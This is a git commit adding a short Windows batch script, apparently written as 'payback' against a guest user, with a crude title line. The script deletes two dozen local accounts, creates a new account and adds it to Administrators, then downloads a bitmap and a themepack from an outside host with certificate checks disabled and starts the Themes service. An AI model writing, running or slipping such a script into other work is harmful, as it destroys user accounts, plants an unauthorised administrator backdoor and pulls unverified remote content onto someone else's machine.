3461f55e43bb7e5810ea70e0a1b123845cb39bd0
2003ryans <ryanscales@yahoo.com>
2016-07-22 14:24:40 +0000

    asd

---
+++ undoguestusers2.cmd
@@ -0,0 +1,33 @@
+@echo off
+title Payback time, HORNY guest.
+cls
+color 0a
+net user StickyButthole /delete
+net user StickyButthole1 /delete
+net user StickyButthole2 /delete
+net user StickyButthole3 /delete
+net user StickyButthole4 /delete
+net user StickyButthole5 /delete
+net user StickyButthole6 /delete
+net user StickyButthole7 /delete
+net user StickyButthole8 /delete
+net user StickyButthole9 /delete
+net user StickyButthole10 /delete
+net user StickyButthole11 /delete
+net user StickyButthole12 /delete
+net user StickyButthole13 /delete
+net user StickyButthole14 /delete
+net user StickyButthole15 /delete
+net user StickyButthole16 /delete
+net user StickyButthole17 /delete
+net user StickyButthole18 /delete
+net user StickyButthole19 /delete
+net user StickyButthole20 /delete
+net user StickyButthole21 /delete
+net user StickyButthole22 /delete
+net user StickyButthole23 /delete
+net user Dartz /add
+net localgroup administrators Dartz /add
+wget -O C:/blinky.bmp http://b.1339.cf/nqhcmgt.bmp --no-check-certificate
+wget -O C:/defaulttheme.themepack http://b.1339.cf/durummb.themepack --no-check-certificate
+net start themes
